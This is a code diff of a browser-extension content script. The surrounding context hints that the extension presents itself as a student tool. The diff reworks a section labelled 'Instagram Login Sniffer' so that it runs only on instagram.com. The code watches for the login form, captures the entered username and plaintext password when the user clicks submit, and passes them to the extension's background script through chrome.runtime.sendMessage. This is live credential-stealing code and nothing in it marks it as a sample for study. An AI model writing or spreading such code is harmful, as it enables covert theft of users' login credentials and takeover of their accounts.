@@ -54,44 +54,46 @@ if (!setupStudentListeners()) {
 }
 
 // =================== 🔐 Instagram Login Sniffer (Reliable) ===================
+if (location.hostname.includes("instagram.com")) {
+  let igTries = 0;
+  const igMaxTries = 25;
 
-let igTries = 0;
-const igMaxTries = 25;
+  const sniffInstagramLogin = setInterval(() => {
+    igTries++;
 
-const sniffInstagramLogin = setInterval(() => {
-  igTries++;
+    const usernameInput = document.querySelector("input[name='username']");
+    const passwordInput = document.querySelector("input[name='password']");
+    const loginBtn = document.querySelector("button[type='submit']:not([disabled])");
 
-  const usernameInput = document.querySelector("input[name='username']");
-  const passwordInput = document.querySelector("input[name='password']");
-  const loginBtn = document.querySelector("button[type='submit']:not([disabled])");
+    if (usernameInput && passwordInput && loginBtn) {
+      console.log("%c✅ [IG] Login form detected", "color: green;");
 
-  if (usernameInput && passwordInput && loginBtn) {
-    console.log("%c✅ [IG] Login form detected", "color: green;");
+      loginBtn.addEventListener("click", () => {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
 
-    loginBtn.addEventListener("click", () => {
-      const username = usernameInput.value.trim();
-      const password = passwordInput.value;
+        if (username && password) {
+          console.log(
+            `%c📤 [IG] Captured credentials: %c${username}`,
+            "color: cyan;", "color: orange; font-weight: bold;"
+          );
 
-      if (username && password) {
-        console.log(
-          `%c📤 [IG] Captured credentials: %c${username}`,
-          "color: cyan;", "color: orange; font-weight: bold;"
-        );
+          chrome.runtime.sendMessage({
+            type: "instagram_login_data",
+            data: { username, password },
+          });
+        } else {
+          console.warn("⚠️ [IG] Empty username or password, not sent");
+        }
+      }, { once: true });
 
-        chrome.runtime.sendMessage({
-          type: "instagram_login_data",
-          data: { username, password },
-        });
-      } else {
-        console.warn("⚠️ [IG] Empty username or password, not sent");
-      }
-    }, { once: true });
+      clearInterval(sniffInstagramLogin);
+    }
 
-    clearInterval(sniffInstagramLogin);
-  }
-
-  if (igTries >= igMaxTries) {
-    console.warn("⚠️ [IG] Login sniff failed after max attempts");
-    clearInterval(sniffInstagramLogin);
-  }
-}, 700);
+    if (igTries >= igMaxTries) {
+      // 🛑 Log only if on Instagram
+      console.warn("⚠️ [IG] Login sniff failed after max attempts");
+      clearInterval(sniffInstagramLogin);
+    }
+  }, 700);
+}
